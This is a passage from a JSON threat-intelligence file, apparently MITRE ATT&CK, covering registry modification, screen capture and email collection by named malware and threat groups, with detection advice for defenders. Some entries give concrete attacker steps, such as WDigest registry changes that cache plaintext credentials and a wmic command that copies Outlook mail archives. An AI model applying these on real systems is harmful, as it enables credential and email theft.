      "Kimsukyhas modified Registry settings for default file associations to enable all macros and for persistence.[92][93][94][95]",
      "KOCTOPUShas added and deleted keys from the Registry.[96]",
      "KONNIhas modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence.[97][98]",
      "LockBit 2.0can create Registry keys to bypass UAC and for persistence.[99]",
      "LockBit 3.0can change the Registry values for Group Policy refresh time, to disable SmartScreen, and to disable Windows Defender.[100][101]",
      "LoJaxhas modified the Registry key‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’from‘autocheck autochk’to‘autocheck autoche’.[102]",
      "Lokibothas modified the Registry as part of its UAC bypass process.[103]",
      "Lotus Blossomhas installed tools such asSagerunexby writing them to the Windows registry.[104]",
      "LuminousMothhas used malware that adds Registry keys for persistence.[105][106]",
      "Mafaldacan manipulate the system registry on a compromised host.[107]",
      "Magic Houndhas modified Registry settings for security tools.[108]",
      "MegaCortexhas added entries to the Registry for ransom contact information.[109]",
      "metaMaincan write the process ID of a target process into theHKEY_LOCAL_MACHINE\\SOFTWARE\\DDE\\tpidRegistry value as part of its reflective loading activity.[107]",
      "Metamorfohas written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.[110][111][112][113]",
      "Morican write data toHKLM\\Software\\NFC\\IPAandHKLM\\Software\\NFC\\and delete Registry values.[114][115]",
      "Mosquitocan modify Registry keys underHKCU\\Software\\Microsoft[dllname]to store configuration values.Mosquitoalso modifies Registry keys underHKCR\\CLSID...\\InprocServer32with a path to the launcher.[116]",
      "Naidcreates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.[117]",
      "NanoCorehas the capability to edit the Registry.[118][119]",
      "Neoichorhas the ability to configure browser settings by modifying Registry entries underHKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer.[120]",
      "Nerexcreates a Registry subkey that registers a new service.[121]",
      "Netwalkercan add the following registry entry:HKEY_CURRENT_USER\\SOFTWARE{8 random characters}.[122]",
      "NETWIREcan modify the Registry to store its configuration information.[123]",
      "DuringNight Dragon, threat actors usedzwShellto establish full remote control of the connected machine and manipulate the Registry.[124]",
      "NightClubcan modify the Registry to set the ServiceDLL for a service created by the malware for persistence.[125]",
      "njRATcan create, delete, or modify a specified Registry key or value.[126][127]",
      "NPPSPYmodifies the Registry to record the malicious listener for output from the Winlogon process.[128]",
      "OilRighas used reg.exe to modify system configuration.[129][130]",
      "DuringOperation Honeybee, the threat actors used batch files that modified registry keys.[131]",
      "DuringOperation Wocao, the threat actors enabled Wdigest by changing theHKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigestregistry value from 0 (disabled) to 1 (enabled).[132]",
      "Orzcan perform Registry operations.[133]",
      "Pandoracan write an encrypted token to the Registry to enable processing of remote commands.[134]",
      "APatchworkpayload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.[135]",
      "PcSharecan delete its persistence mechanisms from the registry.[136]",
      "PHOREALis capable of manipulating the Registry.[137]",
      "Pillowminthas modified the Registry keyHKLM\\SOFTWARE\\Microsoft\\DRMto store a malicious payload.[138]",
      "PipeMonhas modified the Registry to store its encrypted payload.[139]",
      "PLAINTEEusesreg addto add a Registry Run key for persistence.[140]",
      "PlugXhas a module to create, delete, or modify Registry keys.[141]",
      "PoetRAThas made registry modifications to alter its behavior upon execution.[142]",
      "PoisonIvycreates a Registry subkey that registers a new system device.[143]",
      "PolyglotDukecan write encrypted JSON configuration files to the Registry.[144]",
      "PowerShowerhas added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.[145]",
      "Prestigehas the ability to register new registry keys for a new extension handler viaHKCR\\.encandHKCR\\enc\\shell\\open\\command.[146]",
      "Pysahas modified the registry key \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" and added the ransom note.[147]",
      "QakBotcan modify the Registry to store its configuration information in a randomly named subkey underHKCU\\Software\\Microsoft.[148][149]",
      "QUADAGENTmodifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.[150]",
      "QuasarRAThas a command to edit the Registry on the victim’s machine.[151][152]",
      "RCSessioncan write its configuration file to the Registry.[48][153]",
      "Regmay be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.[1]",
      "RegDukecan create seemingly legitimate Registry key to store its encryption key.[144]",
      "Reginappears to have functionality to modify remote Registry information.[154]",
      "Remcoshas full control of the Registry, including the ability to modify it.[155]",
      "REvilcan modify the Registry to save encryption parameters and system information.[156][157][158][159][160]",
      "ROKRATcan modify theHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\registry key so it can bypass the VB object model (VBOM) on a compromised host.[161]",
      "Roverhas functionality to remove Registry Run key persistence as a cleanup procedure.[162]",
      "RTMcan delete all Registry entries created during its execution.[163]",
      "Saint Bearwill leverage malicious Windows batch scripts to modify registry values associated with Windows Defender functionality.[164]",
      "TheSamurailoader component can create multiple Registry keys to force the svchost.exe process to load the final backdoor.[165]",
      "ShadowPadcan modify the Registry to store and maintain a configuration block and virtual file system.[166][64]",
      "OnceShamoonhas access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by settingSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicyto 1.[167][168][169]",
      "ShimRathas registered two registry keys for shim databases.[170]",
      "ShrinkLockermodifies various registry keys associated with system logon and BitLocker functionality to effectively lock-out users following disk encryption.[171][172]",
      "Sibothas modified the Registry to install a second-stage script in theHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot.[173]",
      "Silencecan create, delete, or modify a specified Registry key or value.[174]",
      "SILENTTRINITYcan modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).[175]",
      "SLOTHFULMEDIAcan add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMapregistry.[176]",
      "SMOKEDHAMhas modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.[177]",
      "SOUNDBITEis capable of modifying the Registry.[137]",
      "StreamExhas the ability to modify the Registry.[178]",
      "Stuxnetcan create registry keys to load driver files.[179]",
      "SUNBURSThad commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting theirHKLM\\SYSTEM\\CurrentControlSet\\services\\[service_name]\\Startregistry entries to value 4.[180][181]It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.[182]",
      "SynAckcan manipulate Registry keys.[183]",
      "SysUpdatecan write its configuration file toSoftware\\Classes\\scConfigin eitherHKEY_LOCAL_MACHINEorHKEY_CURRENT_USER.[134]",
      "TA505has used malware to disable Windows Defender through modification of the Registry.[184]",
      "Taidoorhas the ability to modify the Registry on compromised hosts usingRegDeleteValueAandRegCreateKeyExA.[185]",
      "TajMahalcan set theKeepPrintedJobsattribute for configured printers inSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printersto enable document stealing.[186]",
      "Tarraskis able to delete the Security Descriptor (SD) registry subkey in order to \"hide\" scheduled tasks.[187]",
      "TEARDROPmodified the Registry to create a Windows service for itself on a compromised host.[188]",
      "AThreat Group-3390tool has created new Registry keys underHKEY_CURRENT_USER\\Software\\Classes\\andHKLM\\SYSTEM\\CurrentControlSet\\services.[189][134]",
      "ThreatNeedlecan modify the Registry to save its configuration data as the following RC4-encrypted Registry key:HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon.[190]",
      "TinyTurlacan set its configuration parameters in the Registry.[191]",
      "TRANSLATEXThas modified the following registry key to install itself as the value, granting permission to install specified extensions:HKCU\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist.[192]",
      "TrickBotcan modify registry entries.[193]",
      "Turlahas modified Registry values to store payloads.[194][195]",
      "TYPEFRAMEcan install encrypted configuration data under the Registry keyHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dllandHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.[196]",
      "Uroburoscan store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt otherUroburoscomponents.[197]",
      "Ursnifhas used Registry modifications as part of its installation routine.[198][199]",
      "Valakhas the ability to modify the Registry keyHKCU\\Software\\ApplicationContainer\\Appsw64to store information regarding the C2 server and downloads.[200][201][202]",
      "Volgmermodifies the Registry to store an encoded configuration file inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.[203][204]",
      "Volt Typhoonhas usednetshto create a PortProxy Registry modification on a compromised server running the Paessler Router Traffic Grapher (PRTG).[205]",
      "WarzoneRATcan createHKCU\\Software\\Classes\\Folder\\shell\\open\\commandas a new registry key during privilege escalation.[206][207]",
      "WastedLockercan modify registry values within theSoftware\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMapregistry key.[208]",
      "Waterbearhas deleted certain values from the Registry to load a malicious DLL.[209]",
      "Wizard Spiderhas modified the Registry keyHKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigestby setting theUseLogonCredentialregistry value to1in order to force credentials to be stored in clear text in memory.Wizard Spiderhas also modified the WDigest registry key to allow plaintext credentials to be cached in memory.[210][211]",
      "Zeus Pandamodifies several Registry keys underHKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\to disable phishing filters.[212]",
      "zwShellcan modify the Registry.[124]",
      "ZxShellcan create Registry entries to enable services to run.[213]"
    ]
  },
  "T1113": {
    "Name": "Screen Capture",
    "Description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such asCopyFromScreen,xwd, orscreencapture.[1][2]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to take screen captures of the desktop to gather information over the course of an operation.",
      "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk, such asCopyFromScreen,xwd, orscreencapture.[1][2]. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment."
    ],
    "Procedure Examples": [
      "Agent Teslacan capture screenshots of the victim’s desktop.[3][4][5][6][7]",
      "AppleSeedcan take screenshots on a compromised host by calling a series of APIs.[8][9]",
      "APT28has used tools to take screenshots from victims.[10][11][12][13]",
      "APT39has used a screen capture utility to take screenshots on a compromised host.[14][15]",
      "APT42has used malware, such as GHAMBAR and POWERPOST, to take screenshots.[16]",
      "Aria-bodyhas the ability to capture screenshots on compromised hosts.[17]",
      "AsyncRAThas the ability to view the screen on compromised hosts.[18]",
      "Attor's has a plugin that captures screenshots of the target applications.[19]",
      "Azorultcan capture screenshots of the victim’s machines.[20]",
      "BADHATCHcan take screenshots and send them to an actor-controlled C2 server.[21]",
      "BADNEWShas a command to take a screenshot and send it to the C2 server.[22][23]",
      "BadPatchcaptures screenshots in .jpg format and then exfiltrates them.[24]",
      "Bandookis capable of taking an image of and uploading the current desktop.[25][26]",
      "BISCUIThas a command to periodically take screenshots of the system.[27]",
      "BlackEnergyis capable of taking screenshots.[28]",
      "BLUELIGHThas captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.[29]",
      "BRONZE BUTLERhas used a tool to capture screenshots.[30][31]",
      "Brute Ratel C4can take screenshots on compromised hosts.[32]",
      "Cadelspyhas the ability to capture screenshots and webcam photos.[33]",
      "Cannoncan take a screenshot of the desktop.[34]",
      "Carbanakperforms desktop video recording and captures screenshots of the desktop and sends it to the C2 server.[35]",
      "Carberpcan capture display screenshots with the screens_dll.dll plugin.[36]",
      "Cardinal RATcan capture screenshots.[37]",
      "Catchamascaptures screenshots based on specific keywords in the window’s title.[38]",
      "Chaescan capture screenshots of the infected machine.[39]",
      "CharmPowerhas the ability to capture screenshots.[40]",
      "CHIMNEYSWEEPcan capture screenshots on targeted systems using a timer and either upload them or store them to disk.[41]",
      "CHOPSTICKhas the capability to capture screenshots.[12]",
      "Chrommmehas the ability to capture screenshots.[42]",
      "Clamblinghas the ability to capture screenshots.[43]",
      "Cobalt Strike's Beacon payload is capable of capturing screenshots.[44][45][46]",
      "Cobian RAThas a feature to perform screen capture.[47]",
      "ConnectWisecan take screenshots on remote hosts.[48]",
      "CosmicDuketakes periodic screenshots and exfiltrates them.[49]",
      "Crimsoncontains a command to perform screen captures.[50][51][52]",
      "CrossRATis capable of taking screen captures.[25]",
      "Cuckoo Stealercan runscreencaptureto collect screenshots from compromised hosts.[53]",
      "Dark Caracaltook screenshots using their Windows malware.[25]",
      "Daserfcan take screenshots.[54][30]",
      "Derusbiis capable of performing screen captures.[55]",
      "DOGCALLis capable of capturing screenshots of the victim's machine.[56][57]",
      "Dragonflyhas performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).[58][59][60]",
      "DUSTTRAPcan capture screenshots.[61]",
      "DustySkycaptures PNG screenshots of the main screen.[62]",
      "ECCENTRICBANDWAGONcan capture screenshots and store them locally.[63]",
      "Empireis capable of capturing screenshots on Windows and macOS systems.[64]",
      "EvilGrabhas the capability to capture screenshots.[65]",
      "FIN7captured screenshots and desktop video recordings.[66]",
      "FinFishertakes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.[67][68]",
      "Flamecan take regular screenshots when certain applications are open that are sent to the command and control server.[69]",
      "FlawedAmmyycan capture screenshots.[70]",
      "FruitFlytakes screenshots of the user's desktop.[71]",
      "TheFunnyDreamScreenCap component can take screenshots on a compromised host.[72]",
      "Gamaredon Group's malware can take screenshots of the compromised computer every minute.[73]",
      "gh0st RATcan capture the victim’s screen remotely.[74]",
      "GOLD SOUTHFIELDhas used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.[75]",
      "GRIFFONhas used a screenshot module that can be used to take a screenshot of the remote system.[76]",
      "Malware used byGroup5is capable of watching the victim's screen.[77]",
      "HALFBAKEDcan obtain screenshots from the victim.[78]",
      "HotCroissanthas the ability to do real time screen viewing on an infected host.[79]",
      "Hydraqincludes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.[80]",
      "HyperBrohas the ability to take screenshots.[81]",
      "InvisiMolecan capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.[82][83]",
      "Janicabcaptured screenshots and sent them out to a C2 server.[84][85]",
      "AJHUHUGITvariant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.[86][87]",
      "jRAThas the capability to take screenshots of the victim’s machine.[88][89]",
      "Kasidethas the ability to initiate keylogging and screen captures.[90]",
      "Kazuarcaptures screenshots of the victim’s screen.[91]",
      "KeyBoyhas a command to perform screen grabbing.[92]",
      "KEYMARBLEcan capture screenshots of the victim’s machine.[93]",
      "Kimsukyhas captured browser screenshots usingTRANSLATEXT.[94]",
      "Kivarshas the ability to capture screenshots on the infected host.[95]",
      "KONNIcan take screenshots of the victim’s machine.[96]",
      "LightSpyuses Apple's built-in AVFoundation Framework library to access the user's camera and screen. It uses theAVCaptureStillImageto take a picture using the user's camera and theAVCaptureScreento take a screenshot or record the user's screen for a specified period of time.[97]",
      "LitePowercan take system screenshots and save them to%AppData%.[98]",
      "Lizarcan take JPEG screenshots of an infected system.[99][100]",
      "LookBackcan take desktop screenshots.[101]",
      "Lumma Stealerhas taken screenshots of victim machines.[102]",
      "LunarMailcan capture screenshots from compromised hosts.[103]",
      "Machetecaptures screenshots.[104][105][106][107]",
      "MacMahas used Apple’s Core Graphic APIs, such asCGWindowListCreateImageFromArray, to capture the user's screen and open windows.[108][109]",
      "MacSpycan capture screenshots of the desktop over multiple monitors.[71]",
      "Mafaldacan take a screenshot of the target machine and save it to a file.[110]",
      "Magic Houndmalware can take a screenshot and upload the file to its C2 server.[111]",
      "Manjusakacan take screenshots of the victim desktop.[112]",
      "MarkiRATcan capture screenshots that are initially saved as ‘scr.jpg’.[113]",
      "Matryoshkais capable of performing screen captures.[114][115]",
      "metaMaincan take and save screenshots.[110][116]",
      "Metamorfocan collect screenshots of the victim’s machine.[117][118]",
      "Micropsiatakes screenshots every 90 seconds by calling the Gdi32.BitBlt API.[119]",
      "Mispaduhas the ability to capture screenshots on compromised hosts.[120][121][122][123]",
      "MoustachedBouncerhas used plugins to take screenshots on targeted systems.[124]",
      "MuddyWaterhas used malware that can capture screenshots of the victim’s machine.[125]",
      "NETWIREcan capture the victim's screen.[126][127][128][129]",
      "NightClubcan load a module to callCreateCompatibleDCandGdipSaveImageToStreamfor screen capture.[124]",
      "njRATcan capture screenshots of the victim’s machines.[130]",
      "NKAbusecan take screenshots of the victim machine.[131]",
      "ObliqueRATcan capture a screenshot of the current screen.[132]",
      "Octopuscan capture screenshots of the victims’ machine.[133][134][135]",
      "OilRighas a tool called CANDYKING to capture a screenshot of user's desktop.[136]",
      "PcSharecan take screen shots of a compromised machine.[72]",
      "Peppycan take screenshots on targeted systems.[50]",
      "PlugXallows the operator to capture screenshots.[137]",
      "PoetRAThas the ability to take screen captures.[138][139]",
      "POORAIMcan perform screen capturing.[56]",
      "PowerSploit'sGet-TimedScreenshotExfiltration module can take screenshots at regular intervals.[140][141]",
      "POWERSTATScan retrieve screenshots from compromised hosts.[142][143]",
      "POWRUNERcan capture a screenshot from a victim.[144]",
      "Prikormkacontains a module that captures screenshots of the victim's desktop.[145]",
      "Protoncaptures the content of the desktop with the screencapture binary.[71]",
      "Pteranodoncan capture screenshots at a configurable interval.[146][147]",
      "Pupycan drop a mouse-logger that will take small screenshots around at each click and then send back to the server.[148]",
      "Quick Assistallows for the remote administrator to take screenshots of the running system.[149]",
      "QuietSievehas taken screenshots every five minutes and saved them to the user's local Application Data folder underTemp\\SymbolSourceSymbols\\iconsorTemp\\ModeAuto\\icons.[150]",
      "Raccoon Stealercan capture screenshots from victim systems.[151][152]",
      "RainyDayhas the ability to capture screenshots.[153]",
      "Ramsaycan take screenshots every 30 seconds as well as when an external removable storage device is connected.[154]",
      "RCSessioncan capture screenshots from a compromised host.[155]",
      "RDATcan take a screenshot on the infected system.[156]",
      "RedLeavescan capture screenshots.[157][158]",
      "Remcostakes automated screenshots of the infected machine.[159]",
      "Remexitakes screenshots of windows of interest.[160]",
      "RemoteUtilitiescan take screenshots on a compromised host.[161]",
      "Revenge RAThas a plugin for screen capture.[162]",
      "RogueRobinhas a command named$screenshotthat may be responsible for taking screenshots of the victim machine.[163]",
      "ROKRATcan capture screenshots of the infected system using thegdi32library.[164][165][166][167][168]",
      "Rovertakes screenshots of the compromised system's desktop and saves them toC:\\system\\screenshot.bmpfor exfiltration every 60 minutes.[169]",
      "RTMcan capture screenshots.[170][171]",
      "SharpStagehas the ability to capture the victim's screen.[172][173]",
      "SHUTTERSPEEDcan capture screenshots.[56]",
      "Silencecan capture victim screen activity.[174][175]",
      "SILENTTRINITYcan take a screenshot of the current desktop.[176]",
      "Slivercan take screenshots of the victim’s active display.[177]",
      "SLOTHFULMEDIAhas taken a screenshot of a victim's desktop, named it \"Filter3.jpg\", and stored it in the local directory.[178]",
      "SMOKEDHAMcan capture screenshots of the victim’s desktop.[179][180]",
      "Socksbotcan take screenshots.[181]",
      "StoneDrillcan take screenshots.[182]",
      "StrifeWaterhas the ability to take screen captures.[183]",
      "SVCReadycan take a screenshot from an infected host.[184]",
      "SysUpdatehas the ability to capture screenshots.[185]",
      "T9000can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.[186]",
      "TajMahalhas the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.[187]",
      "TinyZBotcontains screen capture functionality.[188]",
      "TRANSLATEXThas the ability to capture screenshots of new browser tabs, based on the presence of theCaptureflag.[94]",
      "Trojan.Karaganycan take a desktop screenshot and save the file into\\ProgramData\\Mail\\MailAg\\shot.png.[189][190]",
      "Troll Stealercan capture screenshots from victim machines.[191][192]",
      "Turianhas the ability to take screenshots.[193]",
      "TURNEDUPis capable of taking screenshots.[194]",
      "UPPERCUTcan capture desktop screenshots in the PNG format and send them to the C2 server.[195]",
      "Ursnifhas used hooked APIs to take screenshots.[196][197]",
      "Valakhas the ability to take screenshots on a compromised host.[198]",
      "VERMINcan perform screen captures of the victim’s machine.[199]",
      "Volt Typhoonhas obtained a screenshot of the victim's system using the gdi32.dll and gdiplus.dll libraries.[200]",
      "Winter Viverndelivered PowerShell scripts capable of taking screenshots of victim machines.[201]",
      "Woody RAThas the ability to take a screenshot of the infected host desktop using Windows GDI+.[202]",
      "XAgentOSXcontains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.[11]",
      "XCSSETsaves a screen capture of the victim's system with a numbered filename and.jpgextension. Screen captures are taken at specified intervals based on the system.[203]",
      "XLoadercan capture screenshots on compromised hosts.[204][205]",
      "ytycollects screenshots of the victim machine.[206]",
      "A variant ofZebrocycaptures screenshots of the victim’s machine in JPEG and BMP format.[34][207][208][209][210][211]",
      "Zeus Pandacan take screenshots of the victim’s machine.[212]",
      "ZLibhas the ability to obtain screenshots of the compromised system.[213]",
      "ZxShellcan capture screenshots.[214]"
    ]
  },
  "T1114": {
    "Name": "Email Collection",
    "Description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.[1][2]Adversaries can collect or forward email from mail servers or clients.",
    "Detects": [
      "Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples includeX-MS-Exchange-Organization-AutoForwardedset to true,X-MailFwdByandX-Forwarded-To. TheforwardingSMTPAddressparameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.[12]High volumes of emails that bear theX-MS-Exchange-Organization-AutoForwardedheader (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.",
      "Monitor executed processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.On Windows systems, monitor for creation of suspicious inbox rules through the use of theNew-InboxRule,Set-InboxRule,New-TransportRule, andSet-TransportRulePowerShell cmdlets.[13][14]",
      "Monitor for unusual processes access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.",
      "Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
    ],
    "Procedure Examples": [
      "Ember Bearattempts to collect mail from accessed systems and servers.[3][4]",
      "Emotethas been observed leveraging a module that can scrape email addresses from Outlook.[5][6][7]",
      "Magic Houndhas compromised email credentials in order to steal sensitive data.[8]",
      "Scattered Spidersearched the victim’s Microsoft Exchange for emails about the intrusion and incident response.[9]",
      "Silent Librarianhas exfiltrated entire mailboxes from compromised accounts.[10]",
      "TRANSLATEXThas exfiltrated collected email addresses to the C2 server.[11]"
    ]
  },
  "T1114.001": {
    "Name": "Email Collection:Local Email Collection",
    "Description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.[1]IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored inC:\\Users\\<username>\\Documents\\Outlook FilesorC:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook.[2]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor for unusual processes accessing local email files that may target user email on local systems to collect sensitive information."
    ],
    "Procedure Examples": [
      "APT1uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files.[3]",
      "Carbanaksearches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.[4]",
      "Chimerahas harvested data from victim's e-mail including through execution ofwmic /node:process call create \"cmd /c copy c:\\Users\\\\\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\\\\\My Documents\\.pst\"copy.[5]",
      "CosmicDukesearches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.[6]",
      "Crimsoncontains a command to collect and exfiltrate emails from Outlook.[7]",
      "Emotethas been observed leveraging a module that scrapes email data from Outlook.[8]",
      "Empirehas the ability to collect emails on a target system.[9]",
      "KGH_SPYcan harvest data from mail clients.[10]",
      "LunarMailcan capture the recipients of sent email messages from compromised accounts.[11]",
      "Magic Houndhas collected .PST archives.[12]",
      "DuringNight Dragon, threat actors used RAT malware to exfiltrate email archives.[13]",
      "Out1can parse e-mails on a target machine.[14]",
      "Pupycan interact with a victim’s Outlook session and look through folders and emails.[15]",
      "QakBotcan target and steal locally stored emails to support thread hijacking phishing campaigns.[16][17][18]",
      "RedCurlhas collected emails to use in future phishing campaigns.[19]",
      "Sea Turtlecollected email archives from victim environments.[20]",
      "Smoke Loadersearches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).[21]",
      "Winter Viverndelivered malicious JavaScript payloads capable of exfiltrating email messages from exploited email servers.[22]"
    ]
  },
  "T1114.002": {
    "Name": "Email Collection:Remote Email Collection",
    "Description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such asMailSnipercan be used to automate searches for specific keywords.",
    "Detects": [
      "In Office365 environments, consider using PurviewAudit to collect MailItemsAccessed events and monitoring for unusual email access behavior.[28]",
      "Monitor executed commands and arguments for actions that may target an Exchange server, Office 365, or Google Workspace to collect sensitive information.",
      "Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).Analytic 1 - Suspicious actor IPs, unusual user agents (e.g., malware, scripting interpreters like PowerShell, Python), anomalous login timesNote: To detect suspicious logon session creation activities related to remote email collection.index=\"azure_ad_signin_logs\" Resource=\"Office 365 Exchange Online\" AND (UserAgent=\"PowerShell\" OR UserAgent=\"AADInternals\")| stats count by UserAgent, UserID, IPAddress, Location| where IPAddress!=\"expected_ip\" OR Location!=\"expected_location\"",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
    ],
    "Procedure Examples": [
      "APT1uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.[1]",
      "APT28has collected emails from victim Microsoft Exchange servers.[2][3]",
      "APT29has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests.[4][5]",
      "Chimerahas harvested data from remote mailboxes including through execution of\\\\c$\\Users\\\\AppData\\Local\\Microsoft\\Outlook*.ost.[6]",
      "Dragonflyhas accessed email accounts using Outlook Web Access.[7]",
      "FIN4has accessed and hijacked online email communications using stolen credentials.[8][9]",
      "HAFNIUMhas used web shells and MSGraph to export mailbox data.[10][11][12]",
      "DuringHomeLand Justice, threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data.[13]",
      "Ke3changhas used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes.[14][15]",
      "Kimsukyhas used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP.[16]",
      "Leafminerused a tool called MailSniper to search through the Exchange server mailboxes for keywords.[17]",
      "LightNeuroncollects Exchange emails matching rules specified in its configuration.[18]",
      "Magic Houndhas exported emails from compromised Exchange servers including through use of the cmdletNew-MailboxExportRequest.[19][20]",
      "MailSnipercan be used for searching through email in Exchange and Office 365 environments.[21]",
      "SomeSeaDukesamples have a module to extract email from Microsoft Exchange servers using compromised credentials.[22]",
      "During theSolarWinds Compromise,APT29collected emails from specific individuals, such as executives and IT staff, usingNew-MailboxExportRequestfollowed byGet-MailboxExportRequest.[23][24]",
      "Star Blizzardhas remotely accessed victims' email accounts to steal messages and attachments.[25]",
      "Valakcan collect sensitive mailing information from Exchange servers, including credentials and the domain certificate of an enterprise.[26]"
    ]
  },
  "T1114.003": {
    "Name": "Email Collection:Email Forwarding Rule",
